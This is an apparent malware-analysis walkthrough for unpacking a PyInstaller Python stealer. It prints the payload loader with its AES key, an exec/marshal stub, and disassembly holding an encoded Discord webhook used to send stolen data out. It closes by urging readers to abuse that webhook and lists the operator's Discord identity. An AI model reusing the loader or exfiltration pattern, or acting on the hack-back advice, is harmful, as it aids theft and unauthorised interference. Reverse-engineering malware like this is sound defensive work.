# A guide to unpacking "TwitchGen1.zip"
- MD5: ffda245ac141114c9edbb3e6bb24ef4c
- SHA256: 4f619b404bac1741a88d50d7326ef8d1346c4494e2a88f5ef6c63835363f6be5
- VT Link: https://www.virustotal.com/gui/file/4f619b404bac1741a88d50d7326ef8d1346c4494e2a88f5ef6c63835363f6be5
- Sample download: https://github.com/4lj4/4lj4.github.io/blob/main/samples/sample-files/TwitchGen1/TwitchGen1.zip

# Required tools:
- Python
- Pyinstxtractor https://github.com/extremecoders-re/pyinstxtractor
- Pycdc https://github.com/zrax/pycdc
- Code editor of your choice
- https://pylingual.io/ (optional, makes life much easier though)
- Some python beautifier (optional, you could do it yourself if you like wasting time)

# Stage 1: Unpacking pyinstaller executable
Run pyinstxtractor on the TwitchGen.exe file.
This will create a folder containing a variety of files.
The files important to us are:
- blank.aes : The encrypted payload
- (really_messed_up_filename).pyc : The code which decrypts the blank.aes payload
Note: I will refer to the decrypter pyc file as "decrypter.pyc" from this point onwards


# Stage 2: decrypting blank.aes
## Dumping decrypter.pyc
Running the file through pylingual gave me a very readable output:
```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: loader-o.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import sys
import base64
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter
zipfile = os.path.join(sys._MEIPASS, 'blank.aes')
module = 'stub-o'
key = base64.b64decode('zFioLa0jCOKlAusFK+lzwpGZIdFms2TN3JTsfI6fdB4=')
iv = base64.b64decode('KtHpVglunMf8mJ+j')

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)
if os.path.isfile(zipfile):
    with open(zipfile, 'rb') as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, 'wb') as f:
        f.write(decrypted)
    zipimporter(zipfile).load_module(module)
```

It is also possible to use pycdc to get most of the file:
```python
# Source Generated with Decompyle++
# File: 72c15a2e-8d31-49dd-8059-8b8333c0a5c6.pyc (Python 3.11)

Unsupported opcode: BEFORE_WITH
import os
import sys
import base64
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter
zipfile = os.path.join(sys._MEIPASS, 'blank.aes')
module = 'stub-o'
key = base64.b64decode('zFioLa0jCOKlAusFK+lzwpGZIdFms2TN3JTsfI6fdB4=')
iv = base64.b64decode('KtHpVglunMf8mJ+j')

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

# WARNING: Decompyle incomplete
```

pycdas can be used to figure out the rest of this file if you dont have pylingual available.

## Writing script to decrypt blank.aes
I used ChatGPT to smush together a script that works acceptably:
```python
import base64
from Crypto.Cipher import AES
import zlib

def decrypt_aes_gcm(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

def read_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

def write_file(file_path, data):
    with open(file_path, 'wb') as file:
        file.write(data)


zipfile = 'blank.aes'
key = base64.b64decode('zFioLa0jCOKlAusFK+lzwpGZIdFms2TN3JTsfI6fdB4=')
iv = base64.b64decode('KtHpVglunMf8mJ+j')


encrypted = read_file(zipfile)
encrypted = zlib.decompress(encrypted[::-1])

decrypted = decrypt_aes_gcm(encrypted, key, iv)

write_file("blank.aes.decrypted.zip", decrypted)
```
After running this code, a zip file containing the file "stub-o.pyc" will be created

# Stage 3: Decompiling and deobfuscating stub-o.pyc
## Decompiling
I found that pycdc managed to decompile the important bits of stub-o.pyc.
This results in a large obfuscated python file

## Deobfuscating
Unfortunately youre going to have to spend a while manually decoding base64 and renaming variables.
Eventually, you will clean it up to the point where you can clearly see it decompressing the data blob.
Here is a section of the file when I deobfuscated it (including my own code that i added to dump it to a file):
```python
dataBlob = # Lots of data
dataBlobList = getattr_obf(
    eval_obf(
        "__import__(\"builtins\")"
    ),
    "list"
)(dataBlob)

dataBlobDecompressed = getattr_obf(eval_obf("__import__(\"lzma\")"),"decompress",)(bytes_obf(dataBlobList))

with open("datablob.decompressed.blankOBF.py", 'wb') as f:
    f.write(dataBlobDecompressed)
```

This results in another obfuscated python file for us to play with

# Stage 4: Deobfuscating blankOBF obfuscated code
The skid was kind enough to leave a comment in this file that states what was used to obfuscate it
```python
# Obfuscated using https://github.com/Blank-c/BlankOBF
```
This file is pretty easy to deobfuscate compared to the previous one, as its much smaller.
You should end up with deobfuscated code that looks like this:
```python
dataBlob1 = # ...
dataBlob2 = # ...
dataBlob3 = # ...
dataBlob4 = # ...
__import__("builtins").exec(
    __import__("marshal").loads(
        __import__("base64").b64decode(
            __import__("codecs").decode(dataBlob3,"rot13",)                          
            + dataBlob4
            + dataBlob1[::-1]
            + dataBlob2
        )
    )
)
```
# Stage 5: dumping malware source disassembly
The deobfuscated file can then easily be modified so that instead of executing the loaded code, it is disassembled and written to a file
```python
dataBlob1 = # ...
dataBlob2 = # ...
dataBlob3 = # ...
dataBlob4 = # ...
dataBlobDecoded = __import__("base64").b64decode(
            __import__("codecs").decode(dataBlob3,"rot13",)                          
            + dataBlob4
            + dataBlob1[::-1]
            + dataBlob2
        )

import marshal
import dis
from contextlib import redirect_stdout

def disassemble_and_save(code_object, output_file):
    with open(output_file, 'w') as f:
        with redirect_stdout(f):
            dis.dis(code_object)

loadedCode = marshal.loads(dataBlobDecoded)
disassemble_and_save(loadedCode, "datablob.decompressed.deblankOBFuscated.disassembled.txt")
```

# Stage 6: Extracting useful data (discord webhook)
At this point, it is possible to gather all kinds of interesting information about the malware.
Unsurprisingly, by searching various strings that appear in the disassembled code it can be found that this file is all over github, copypasted by skids.
From this, its possible to see the original source code and see that this is in fact a skiddy stealer.
The juicy information for us is the discord webhook used to extract stolen data. I found the section of code containing this at line 1178:
```
Disassembly of <code object Settings at 0x55e16cf9ffe0, file "<string>", line 27>:
 27           0 RESUME                   0
              2 LOAD_NAME                0 (__name__)
              4 STORE_NAME               1 (__module__)
              6 LOAD_CONST               0 ('Settings')
              8 STORE_NAME               2 (__qualname__)

 29          10 LOAD_CONST               1 (0)
             12 PUSH_NULL
             14 LOAD_NAME                3 (base64)
             16 LOAD_ATTR                4 (b64decode)
             26 LOAD_CONST               2 ('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTE2NzIwMDEzODgxMzUxMzc4MC8tMnRlblFuTXYwYXpZY2JqWHYxOEdyd0lkeGxNM2hoTXhoNjhVc0JiaXhmNGJOQ0gzNW9lZGI1QTBCbUhsaDljMDh3Ng==')
             28 PRECALL                  1
             32 CALL                     1
             42 LOAD_METHOD              5 (decode)
             64 PRECALL                  0
             68 CALL                     0
             78 BUILD_TUPLE              2
             80 STORE_NAME               6 (C2)
```

# Stage 7: Troll the discord webhook
If the webhook is active, you can get the username/userID of the skid operating this malware.
I found the following user information:
- id: 1130510361536241664
- username: zade1x
- global_name: Zade

You can then use the webhook link to upload anything you want to their discord server :)
